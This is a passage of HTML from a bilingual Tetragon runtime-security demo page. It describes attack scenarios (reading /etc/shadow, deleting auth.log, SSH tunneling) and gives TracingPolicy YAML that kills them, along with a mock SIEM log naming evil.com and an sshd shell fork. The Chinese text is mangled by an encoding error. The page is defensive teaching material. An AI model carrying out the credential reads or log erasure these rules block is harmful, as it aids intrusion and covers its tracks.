            <span lang="zh">å¯åŠ¨æ¼”ç»ƒ</span><span lang="en">Start Lab</span>
        </button>
        <button class="btn-outline" onclick="resetTerminal('labOut2')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">é‡ç½®ç»ˆç«¯</span><span lang="en">Reset Terminal</span>
        </button>
    </div>
    <div class="terminal" id="term-wrap-2">
        <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
        <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
        <div class="terminal-content" id="labOut2">
            <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">Last login: Today from 192.168.1.5</div>
            <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
        </div>
    </div>
</div>
<div class="mechanism-card" id="card-scenario-3">
    <div class="enforcement-status" id="status-3">
        <div class="status-dot"></div>
        <span class="status-text">MODE: MONITORING</span>
    </div>
    <div class="case-badge" style="background: var(--cisco-orange);">Scenario III</div>
    <span class="mitre-tag">MITRE T1003.001</span>
    <h4 style="border-left: 4px solid var(--cisco-blue); padding-left: 15px; color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
        <span lang="zh">å‡­æ®è·å–ï¼šæ•æ„Ÿæ–‡ä»¶è®¿é—®é™åˆ¶</span><span lang="en">Credential Access: Sensitive File Access Restriction</span>
    </h4>
    <div class="view-section">
        <p>
            <strong><span lang="zh">æ”»å‡»åŸç†ï¼šè¯»å– Shadow æ–‡ä»¶ã€‚</span><span lang="en">Attack Principle: Reading Shadow File.</span></strong> 
            <span lang="zh">Dark-Chain è¯•å›¾çªƒå– Root å¯†ç å“ˆå¸Œä»¥è¿›è¡Œå¤§è§„æ¨¡æ¨ªå‘ç§»åŠ¨ã€‚å³ä½¿æ‹¥æœ‰ Root æƒé™ï¼Œæ­¤ç±»è¡Œä¸ºä¹Ÿåº”è¢«è§†ä¸ºå¼‚å¸¸ã€‚</span><span lang="en">Dark-Chain attempts to steal Root password hashes for large-scale lateral movement. Even with Root privileges, such behavior should be considered abnormal.</span>
        </p>
        <p>
            <strong><span lang="zh">Tetragon å¯¹ç­–ï¼š</span><span lang="en">Tetragon Response:</span></strong> 
            <span lang="zh">åˆ©ç”¨ LSM é’©å­å¯¹ <code>/etc/shadow</code> å®æ–½é›¶ä¿¡ä»»é˜²æŠ¤ï¼Œä»…å…è®¸åˆæ³•çš„ <code>passwd</code> æˆ– <code>login</code> è¿›ç¨‹è¯»å–ã€‚</span><span lang="en">Utilizing LSM hooks to implement zero-trust protection for <code>/etc/shadow</code>, allowing only legitimate <code>passwd</code> or <code>login</code> processes to read it.</span>
        </p>
    </div>
    <div class="yaml-block"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"shadow-file-access"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Equal"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/shadow"</span>]
      <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"NotIn"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/bin/passwd"</span>, <span class="yaml-val">"/usr/sbin/chpasswd"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
      <div class="architect-note">
    <strong><span lang="zh">ğŸ” æ¶æ„å¸ˆç¬”è®°ï¼šåˆè§„æ€§è¯æ®è‡ªåŠ¨åŒ–</span><span lang="en">ğŸ” Architect's Note: Compliance Evidence Automation</span></strong>
    <p>
        <span lang="zh">å¯¹äº SOC2 æˆ– PCI-DSS å®¡è®¡ï¼Œè¯æ˜â€œè°ä¸èƒ½è¯»â€æ¯”â€œè°è¯»äº†â€æ›´éš¾ã€‚Tetragon çš„ <code>NotIn</code> é€»è¾‘ç›´æ¥åœ¨å†…æ ¸å±‚çº§å®æ–½äº†â€œæœ€å°æƒé™â€ï¼Œå…¶é˜»æ–­è®°å½•å¯ç›´æ¥ä½œä¸º<b>åˆè§„æ€§æ§åˆ¶ç‚¹ï¼ˆControl Pointï¼‰</b>çš„è‡ªåŠ¨åŒ–è¯æ˜ã€‚</span>
        <span lang="en">For SOC2/PCI-DSS, proving "who cannot read" is harder than "who did." Tetragon's <code>NotIn</code> logic implements Least Privilege at the kernel level, providing automated proof for <b>Compliance Control Points</b> via its denial logs.</span>
    </p>
</div>
    <div style="display: flex; gap: 12px; margin-top: 15px;">
        <button class="btn-primary" onclick="runLabPhase(3)" id="labBtn3" style="background: var(--cisco-orange); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">å¯åŠ¨æ¼”ç»ƒ</span><span lang="en">Start Lab</span>
        </button>
        <button class="btn-outline" onclick="resetTerminal('labOut3')" style="background: transparent; border: 1px solid var(--cisco-orange); color: var(--cisco-orange); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">é‡ç½®ç»ˆç«¯</span><span lang="en">Reset Terminal</span>
        </button>
    </div>
    <div class="terminal" id="term-wrap-3">
        <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
        <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
        <div class="terminal-content" id="labOut3">
            <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">Last login: Today from 192.168.1.5</div>
            <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
        </div>
    </div>
</div>

<div class="mechanism-card" id="card-scenario-4">
    <div class="enforcement-status" id="status-4">
        <div class="status-dot"></div>
        <span class="status-text">MODE: MONITORING</span>
    </div>
    <div class="case-badge" style="background: var(--cisco-slate);">Scenario IV</div>
    <span class="mitre-tag">MITRE T1070</span>
    <h4 style="border-left: 4px solid var(--cisco-blue); padding-left: 15px; color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
        <span lang="zh">é˜²å¾¡é€ƒé€¸ï¼šæ—¥å¿—æŠ¹é™¤å®æ—¶æ‹¦æˆª</span><span lang="en">Defense Evasion: Real-time Log Erasure Interception</span>
    </h4>
    <div class="view-section">
        <p>
            <strong><span lang="zh">æ”»å‡»åŸç†ï¼šåˆ é™¤ auth.logã€‚</span><span lang="en">Attack Principle: Deleting auth.log.</span></strong> 
            <span lang="zh">ä¸ºäº†ä¸ç•™ä¸‹è››ä¸é©¬è¿¹ï¼ŒDark-Chain å°è¯•åˆ é™¤æ‰€æœ‰çš„å®¡è®¡è®°å½•ã€‚ç”±äºè¿™æ˜¯äºšç§’çº§çš„åˆ é™¤åŠ¨ä½œï¼ŒSIEM å¾€å¾€æ¥ä¸åŠè®°å½•ã€‚</span><span lang="en">To leave no trace, Dark-Chain attempts to delete all audit records. Since this is a sub-second deletion, SIEM often fails to record it in time.</span>
        </p>
        <p>
            <strong><span lang="zh">Tetragon å¯¹ç­–ï¼š</span><span lang="en">Tetragon Response:</span></strong> 
            <span lang="zh">åœ¨å†…æ ¸å±‚çº§ç›‘æ§ <code>unlinkat</code> ç³»ç»Ÿè°ƒç”¨ã€‚åªè¦é’ˆå¯¹ç³»ç»Ÿæ—¥å¿—è·¯å¾„çš„åˆ é™¤åŠ¨ä½œå‘ç”Ÿï¼Œå†…æ ¸ç«‹å³é˜»æ–­å¹¶å°†â€œæ­£åœ¨åˆ é™¤â€çš„è¡Œä¸ºè¯æ®ä¸ŠæŠ¥ã€‚</span><span lang="en">Monitoring the <code>unlinkat</code> system call at the kernel level. As soon as a deletion action targeting the system log path occurs, the kernel immediately blocks it and reports evidence of the "attempted deletion."</span>
        </p>
    </div>
    <div class="yaml-block"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"log-integrity-shield"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_unlinkat"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Postfix"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"auth.log"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
    <div style="display: flex; gap: 12px; margin-top: 15px;">
        <button class="btn-primary" onclick="runLabPhase(4)" id="labBtn4" style="background: var(--cisco-slate); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">å¯åŠ¨æ¼”ç»ƒ</span><span lang="en">Start Lab</span>
        </button>
        <button class="btn-outline" onclick="resetTerminal('labOut4')" style="background: transparent; border: 1px solid var(--cisco-slate); color: var(--cisco-slate); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">é‡ç½®ç»ˆç«¯</span><span lang="en">Reset Terminal</span>
        </button>
    </div>
    <div class="terminal" id="term-wrap-4">
        <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
        <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
        <div class="terminal-content" id="labOut4">
            <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">Last login: Today from 192.168.1.5</div>
            <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
        </div>
    </div>
</div>
<div class="mechanism-card" id="card-scenario-5">
    <div class="enforcement-status" id="status-5">
        <div class="status-dot"></div>
        <span class="status-text">MODE: MONITORING</span>
    </div>
    <div class="case-badge" style="background: var(--cisco-red);">Scenario V</div>
    <span class="mitre-tag">MITRE T1021</span>
    <h4 style="border-left: 4px solid var(--cisco-blue); padding-left: 15px; color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
        <span lang="zh">æ¨ªå‘ç§»åŠ¨ï¼šéæ³•éš§é“é˜»æ–­</span><span lang="en">Lateral Movement: Illegal Tunnel Interception</span>
    </h4>
    <div class="view-section">
        <p>
            <strong><span lang="zh">æ”»å‡»åŸç†ï¼šSSH éš§é“ã€‚</span><span lang="en">Attack Principle: SSH Tunneling.</span></strong> 
            <span lang="zh">æ”»å‡»è€…å»ºç«‹ SSH éš§é“å‡†å¤‡åŠ å¯†å¹¶ä¼ è¾“æ ¸å¿ƒæ•°æ®åº“ã€‚è¿™å¯¹ç½‘ç»œæµé‡åˆ†æ (NTA) æ¥è¯´çœ‹èµ·æ¥åªæ˜¯æ™®é€šçš„ SSH æµé‡ã€‚</span><span lang="en">Attackers establish an SSH tunnel to encrypt and transfer the core database. To Network Traffic Analysis (NTA), this appears as ordinary SSH traffic.</span>
        </p>
        <p>
            <strong><span lang="zh">Tetragon å¯¹ç­–ï¼š</span><span lang="en">Tetragon Response:</span></strong> 
            <span lang="zh">ç»“åˆä¸Šä¸‹æ–‡æ„ŸçŸ¥ã€‚è™½ç„¶ SSH è¿›ç¨‹åˆæ³•ï¼Œä½†å¦‚æœå…¶å‘èµ·çš„è¿æ¥ç›®æ ‡æ˜¯æ•°æ®åº“ç½‘æ®µä¸”æœªç»æˆæƒï¼ŒTetragon ä¼šå¼ºåˆ¶ä¸­æ–­ Socket è¿æ¥ã€‚</span><span lang="en">Context-aware sensing. Although the SSH process is legitimate, Tetragon will forcibly interrupt the socket connection if the target is an unauthorized database network segment.</span>
        </p>
    </div>
    <div class="yaml-block"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"db-network-isolation"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_connect"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"sockaddr"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Equal"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"10.0.0.50"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
    <div style="display: flex; gap: 12px; margin-top: 15px;">
        <button class="btn-primary" onclick="runLabPhase(5)" id="labBtn5" style="background: var(--cisco-red); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">å¯åŠ¨æ¼”ç»ƒ</span><span lang="en">Start Lab</span>
        </button>
        <button class="btn-outline" onclick="resetTerminal('labOut5')" style="background: transparent; border: 1px solid var(--cisco-red); color: var(--cisco-red); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">é‡ç½®ç»ˆç«¯</span><span lang="en">Reset Terminal</span>
        </button>
    </div>
    <div class="terminal" id="term-wrap-5">
        <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
        <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
        <div class="terminal-content" id="labOut5">
            <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">Last login: Today from 192.168.1.5</div>
            <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
        </div>
    </div>
</div>

<div class="container" style="margin-top: 60px;">
    <div class="section-header">
        <h3>
            <span lang="zh">é˜²å¾¡å¯è§†åŒ–ï¼šCisco XDR & Splunk å®æˆ˜ä»ªè¡¨ç›˜</span><span lang="en">Defense Visualization: Cisco XDR & Splunk Operational Dashboard</span>
        </h3>
        <p>
            <span lang="zh">Tetragon æä¾›çš„äºšæ¯«ç§’çº§ä¿¡å·ï¼Œä¸ä»…åœ¨å†…æ ¸å®æ–½é˜»æ–­ï¼Œè¿˜ä¼šå®æ—¶å–‚ç»™ SIEMï¼Œä¸º SecOps æä¾›å®Œæ•´çš„å¨èƒè§†å›¾ã€‚</span><span lang="en">The sub-millisecond signals provided by Tetragon not only enforce blocking in the kernel but also feed into SIEM in real-time, providing SecOps with a complete threat view.</span>
        </p>
    </div>
    
    <div class="dashboard-mock" style="border: 2px solid var(--cisco-blue); background: #1C222D; border-radius: 12px; padding: 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); position: relative; overflow: hidden;">
        <div style="background: #2A2A2A; padding: 10px 20px; border-bottom: 1px solid #444; display: flex; justify-content: space-between; align-items: center;">
            <strong style="color: #61C6E2;">Splunk Dashboard: Tetragon Enforcement Overview</strong>
            <span style="font-size: 0.75rem; color: #888;">Live Updates: Every 5s</span>
        </div>
        <div style="padding: 20px;">
            <div class="dash-grid" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px;">
                <div class="dash-widget" style="background: #262E3D; border-radius: 8px; padding: 15px; border: 1px solid rgba(255,255,255,0.05);">
                    <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">TOTAL SIGKILL EVENTS (LAST 1H)</div>
                    <div class="dash-value" style="color: var(--cisco-red); font-size: 1.8rem; font-weight: bold;"> 128 </div>
                    <div style="height: 40px; background: linear-gradient(90deg, transparent 0%, var(--cisco-red) 50%, transparent 100%); opacity: 0.2; margin-top:10px;"></div>
                </div>
                <div class="dash-widget" style="background: #262E3D; border-radius: 8px; padding: 15px; border: 1px solid rgba(255,255,255,0.05);">
                    <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">TOP BLOCKED BINARY</div>
                    <div class="dash-value" style="color: var(--cisco-blue); font-size: 1.6rem; font-weight: bold;"> /bin/sh </div>
                    <div style="font-size: 0.7rem; color: #888; margin-top: 5px;">Origin: sshd (CVE-2024-3094)</div>
                </div>
            </div>
            
            <div style="margin-top: 20px; background: #0D1117; padding: 15px; border-radius: 8px; border: 1px solid #30363d;">
                <div style="font-size: 0.75rem; color: #6ABF4B; border-bottom: 1px solid #30363d; padding-bottom: 8px; margin-bottom: 10px;">
                    <span lang="zh">SIEM å®æ—¶å¨èƒæ—¥å¿—</span><span lang="en">SIEM REAL-TIME THREAT LOGS</span>
                </div>
                <div style="font-family: 'Courier New', monospace; font-size: 0.7rem; color: #ADBAC7; line-height: 1.8;">
                    <span style="color: #E2231A;">[CRITICAL]</span> 14:20:05 - Tetragon SIGKILL - Policy: "protect-ld-preload" - PID: 1402 - File: /etc/ld.so.preload<br>
                    <span style="color: #F58025;">[WARNING]</span> 14:20:02 - Tetragon ALERT - Suspicious Network Activity - Host: evil.com - IP: 185.151.x.x<br>
                    <span style="color: #E2231A;">[CRITICAL]</span> 14:19:48 - Tetragon SIGKILL - Policy: "block-sshd-fork" - Origin: /usr/sbin/sshd - Action: fork(/bin/sh)
                </div>
            </div>
        </div>
    </div>
</div>
<style>
    /* --- MTTR å¡ç‰‡æ ·å¼è¿˜åŸ --- */
    .mttr-card {
        background: white;
        padding: 25px;
        border-radius: 12px;
        box-shadow: var(--shadow-card);
        margin-top: 30px;
        border-left: 5px solid var(--cisco-green);
    }
    .mttr-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 20px;
        margin-top: 15px;
    }
    .mttr-stat {
        background: #F8FAFC;
        padding: 15px;
        border-radius: 8px;
    }
    .dash-label { color: #888; font-size: 0.75rem; margin-bottom: 5px; }
    .dash-value { font-weight: bold; }

    @media (max-width: 768px) {
        .mttr-grid { grid-template-columns: 1fr; }
    }
</style>
<div class="mttr-card">
    <h4 style="color: var(--cisco-midnight);">
        <span lang="zh">æ€§èƒ½å¯¹æ¯”ï¼šå¹³å‡å“åº”æ—¶é—´ (MTTR)</span><span lang="en">Performance Comparison: Mean Time to Respond (MTTR)</span>
    </h4>
    <div class="mttr-grid">
        <div class="mttr-stat">
            <div class="dash-label">
                <span lang="zh">ä¼ ç»Ÿæ—¥å¿—åˆ†æ + è‡ªåŠ¨åŒ–</span><span lang="en">Traditional Log Analysis + Automation</span>
            </div>
            <div class="dash-value" style="color: var(--cisco-red); font-size: 1.2rem;">
                <span lang="zh">~ 5 - 15 åˆ†é’Ÿ</span><span lang="en">~ 5 - 15 Minutes</span>
            </div>
            <p style="font-size: 0.75rem; margin-top:5px; color: #666;">
                <span lang="zh">(æ”¶é›† -> ä¼ è¾“ -> åˆ†æ -> ç­–ç•¥ä¸‹å‘)</span><span lang="en">(Collect -> Transfer -> Analyze -> Policy Distribution)</span>
            </p>
        </div>
        
        <div class="mttr-stat">
            <div class="dash-label">
                <span lang="zh">Tetragon å†…æ ¸æ€å¼ºåˆ¶æ‰§è¡Œ</span><span lang="en">Tetragon In-Kernel Enforcement</span>
            </div>
            <div class="dash-value" style="color: var(--cisco-green); font-size: 1.2rem;">
                <span lang="zh">&lt; 500 å¾®ç§’</span><span lang="en">&lt; 500 Microseconds</span>
            </div>
            <p style="font-size: 0.75rem; margin-top:5px; color: #666;">
                <span lang="zh">(å†…æ ¸æ€å®æ—¶è¯†åˆ«å¹¶å‘é€ SIGKILL)</span><span lang="en">(In-kernel real-time identification & SIGKILL dispatch)</span>
            </p>
        </div>
    </div>
</div>
        </div>
</section>
<section id="roadmap" style="background: white; padding: 80px 0;">
    <div class="container">
        <div class="section-header">
            <h2>
                <span lang="zh">ä»è§‚æµ‹åˆ°é˜²å¾¡ï¼šä¼ä¸šçº§æ¼”è¿›å»ºè®®</span><span lang="en">From Observation to Defense: Enterprise Evolution Roadmap</span>
            </h2>
            <p>
                <span lang="zh">å»ºè®¾äº‘åŸç”Ÿè¿è¡Œæ—¶å®‰å…¨ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œæˆ‘ä»¬å»ºè®®é‡‡ç”¨â€œæ¸è¿›å¼â€é˜²å¾¡è·¯çº¿ã€‚</span><span lang="en">Building cloud-native runtime security is a journey; we recommend a "progressive" defensive strategy.</span>
            </p>
        </div>
        
        <div class="roadmap-container" style="display: flex; gap: 20px; margin: 40px 0;">
            <div class="roadmap-step" style="flex: 1; background: white; padding: 25px; border-radius: 12px; border: 1px solid var(--cisco-platinum); position: relative; box-shadow: var(--shadow-card);">
                <div class="step-num" style="width: 24px; height: 24px; background: var(--cisco-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; margin-bottom: 15px;">1</div>
                <strong><span lang="zh">è¿è¡Œæ—¶å¯è§æ€§ (Visibility)</span><span lang="en">Runtime Visibility</span></strong>
                <p style="font-size: 0.85rem; margin-top:10px; line-height: 1.6;">
                    <span lang="zh">åˆæ­¥éƒ¨ç½² Tetragonã€‚å¼€å¯æ‰€æœ‰å…³é”®ç³»ç»Ÿè°ƒç”¨çš„å®¡è®¡æ—¥å¿—ï¼ˆAudit Logsï¼‰ï¼Œå°†é«˜è´¨é‡çš„å†…æ ¸åŸå§‹ä¿¡å·é€å…¥ Splunk/Cisco XDRï¼Œå»ºç«‹å…¨ç½‘èµ„äº§è¡Œä¸ºè§†å›¾ã€‚</span><span lang="en">Initial Tetragon deployment. Enable Audit Logs for all critical syscalls, funneling high-quality raw kernel signals into Splunk/Cisco XDR to build a comprehensive asset behavior view.</span>
                </p>
            </div>
            <div class="roadmap-step" style="flex: 1; background: white; padding: 25px; border-radius: 12px; border: 1px solid var(--cisco-platinum); position: relative; box-shadow: var(--shadow-card);">
                <div class="step-num" style="width: 24px; height: 24px; background: var(--cisco-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; margin-bottom: 15px;">2</div>
                <strong><span lang="zh">ç­–ç•¥å‘ç° (Discovery)</span><span lang="en">Policy Discovery</span></strong>
                <p style="font-size: 0.85rem; margin-top:10px; line-height: 1.6;">
                    <span lang="zh">åœ¨æµ‹è¯•/é¢„å‘ç¯å¢ƒå¼€å¯ç­–ç•¥å‘ç°åŠŸèƒ½ã€‚é€šè¿‡è§‚å¯Ÿåˆæ³•è¿›ç¨‹ï¼ˆå¦‚ Java/Nginxï¼‰çš„è¡Œä¸ºï¼Œè‡ªåŠ¨æç‚¼å‡ºâ€œå·²çŸ¥è‰¯å¥½â€çš„é»„é‡‘è¡Œä¸ºç™½åå•ã€‚</span><span lang="en">Enable policy discovery in staging. By observing legitimate process behaviors (e.g., Java/Nginx), automatically refine "Known-Good" golden behavior whitelists.</span>
                </p>
            </div>
            <div class="roadmap-step" style="flex: 1; background: white; padding: 25px; border-radius: 12px; border: 1px solid var(--cisco-blue); position: relative; box-shadow: var(--shadow-card);">
                <div class="step-num" style="width: 24px; height: 24px; background: var(--cisco-midnight); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; margin-bottom: 15px;">3</div>
                <strong><span lang="zh">å†…æ ¸æ€å¼ºåˆ¶æ‰§è¡Œ (Enforcement)</span><span lang="en">In-Kernel Enforcement</span></strong>
                <p style="font-size: 0.85rem; margin-top:10px; line-height: 1.6;">
                    <span lang="zh">æ­£å¼ä¸‹å‘ SIGKILL é˜»æ–­ç­–ç•¥ã€‚å°†é˜²å¾¡è¾¹ç•Œä»â€œæ£€æµ‹å¹¶æŠ¥è­¦â€æå‡è‡³â€œäºšæ¯«ç§’çº§å†…æ ¸æ€å¼ºåˆ¶é˜»éš”â€ï¼Œå½»åº•æœç» TOCTOU æ”»å‡»ã€‚</span><span lang="en">Formally deploy SIGKILL enforcement policies. Elevate defense from "detect and alert" to "sub-millisecond kernel enforcement," eliminating TOCTOU attacks.</span>
                </p>
            </div>
        </div>
    </div>
</section>
<section style="padding: 60px 0; background: #fff; border-bottom: 1px solid var(--cisco-platinum);">
    <div class="container">
        <h3 style="text-align: center; margin-bottom: 40px; color: var(--cisco-midnight);">
            <span lang="zh">èƒ½åŠ›è·ƒè¿ï¼šä¸ºä»€ä¹ˆé€‰æ‹© Tetragonï¼Ÿ</span><span lang="en">The Leap: Why Choose Tetragon?</span>
        </h3>
        <div class="blindspot-table-wrapper">
        <table class="blindspot-table" style="width: 100%; border-collapse: collapse; border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-card);">
            <thead>
                <tr style="background: var(--cisco-midnight);">
                    <th style="color: white; padding: 15px; text-align: left;"><span lang="zh">ç»´åº¦</span><span lang="en">Dimension</span></th>
                    <th style="background: #f2f2f2; color: #555; padding: 15px; text-align: left;"><span lang="zh">ä¼ ç»Ÿå®‰å…¨ (Dark Ages)</span><span lang="en">Traditional Security</span></th>
                    <th style="background: var(--cisco-blue); color: white; padding: 15px; text-align: left;"><span lang="zh">Tetragon (Immune Era)</span><span lang="en">Tetragon Era</span></th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum);"><strong><span lang="zh">é˜²å¾¡å»¶è¿Ÿ</span><span lang="en">Defense Latency</span></strong></td>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum);"><span lang="zh">åˆ†é’Ÿçº§ (åˆ†ææ—¥å¿—åå¤„ç½®)</span><span lang="en">Minutes (Post-log analysis)</span></td>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum); color: var(--cisco-blue); font-weight: bold;"><span lang="zh">å¾®ç§’çº§ (å†…æ ¸æ€åŒæ­¥é˜»æ–­)</span><span lang="en">Microseconds (In-kernel sync)</span></td>
                </tr>
                <tr>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum);"><strong><span lang="zh">å¯¹æŠ— Rootkit</span><span lang="en">Anti-Rootkit</span></strong></td>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum);"><span lang="zh">æ˜“è¢«åŠ«æŒ/ç»•è¿‡</span><span lang="en">Easily bypassed/hijacked</span></td>
                    <td style="padding: 15px; border-bottom: 1px solid var(--cisco-platinum); color: var(--cisco-blue); font-weight: bold;"><span lang="zh">åŸºäº LSMï¼Œæƒé™é«˜äºæ”»å‡»è€…</span><span lang="en">LSM-based, higher privilege</span></td>
                </tr>
                <tr>
                    <td style="padding: 15px;"><strong><span lang="zh">æ€§èƒ½æŸè€—</span><span lang="en">Performance Loss</span></strong></td>
                    <td style="padding: 15px;"><span lang="zh">é«˜ (ç”±äºä¸Šä¸‹æ–‡åˆ‡æ¢)</span><span lang="en">High (Context switching)</span></td>
                    <td style="padding: 15px; color: var(--cisco-blue); font-weight: bold;"><span lang="zh">æä½ (< 1% CPU)</span><span lang="en">Minimal (< 1% CPU)</span></td>
                </tr>
            </tbody>
        </table></div>
    </div>
</section>

<style>
    /* --- æ€»ç»“éƒ¨åˆ† (Final Conclusion) æ ·å¼è¿˜åŸ --- */
    .final-conclusion { 
        background-color: var(--cisco-midnight) !important; 
        padding: 100px 0; 
        color: #FFFFFF !important; 
        border-bottom: none;
    }
    .final-conclusion h2 { 
        color: #FFFFFF !important; 
        text-align: center; 
        margin-bottom: 40px; 
        font-size: 2.5rem; 
    }
    .final-conclusion h2::after { 
        content: ''; display: block; width: 80px; height: 4px; background: var(--cisco-blue); margin: 20px auto 0;
    }
    .conclusion-core { 
        color: #FFFFFF !important; 
        font-size: 1.35rem; 
        max-width: 900px; 
        margin: 0 auto 60px; 
        text-align: center; 
        line-height: 1.8; 
        font-weight: 500;
        background: rgba(255,255,255,0.05);
        padding: 30px;
        border-radius: 12px;
        border: 1px solid rgba(255,255,255,0.1);
    }
